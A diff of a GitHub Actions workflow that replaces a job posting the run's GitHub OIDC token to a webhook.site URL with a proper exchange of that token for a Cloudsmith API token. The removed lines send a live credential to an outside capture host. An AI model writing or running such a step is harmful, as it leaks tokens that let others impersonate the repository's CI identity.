@@ -1,4 +1,4 @@
-name: Get OIDC Token
+name: Cloudsmith OIDC Auth
 on:
   push:
     branches: [main]
@@ -9,15 +9,25 @@ permissions:
   contents: read
 
 jobs:
-  get-token:
+  deploy:
     runs-on: ubuntu-latest
     steps:
-      - name: Fetch OIDC JWT
+      - uses: actions/checkout@v4
+
+      - name: Get GitHub OIDC Token
         run: |
           JWT=$(curl -sLS \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://api.cloudsmith.io/openid/alex-test-3vdp/" \
             -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             | jq -r .value)
-          curl -s -X POST "https://b5bfbf58-f5a8-419c-a81a-d4690bb5005f.webhook.site" \
+          CLOUDSMITH_TOKEN=$(curl -s -X POST "https://api.cloudsmith.io/openid/alex-test-3vdp/" \
             -H "Content-Type: application/json" \
-            -d "{\"jwt\": \"$JWT\"}"
+            -d "{\"oidc_token\": \"$JWT\", \"service_slug\": \"oidc-svc\"}" \
+            | jq -r '.token')
+          echo "CLOUDSMITH_TOKEN=$CLOUDSMITH_TOKEN" >> $GITHUB_ENV
+          echo "::add-mask::$CLOUDSMITH_TOKEN"
+
+      - name: Use Cloudsmith token
+        run: |
+          curl -s "https://api.cloudsmith.io/user/self/" \
+            -H "X-Api-Key: Bearer $CLOUDSMITH_TOKEN" | jq .
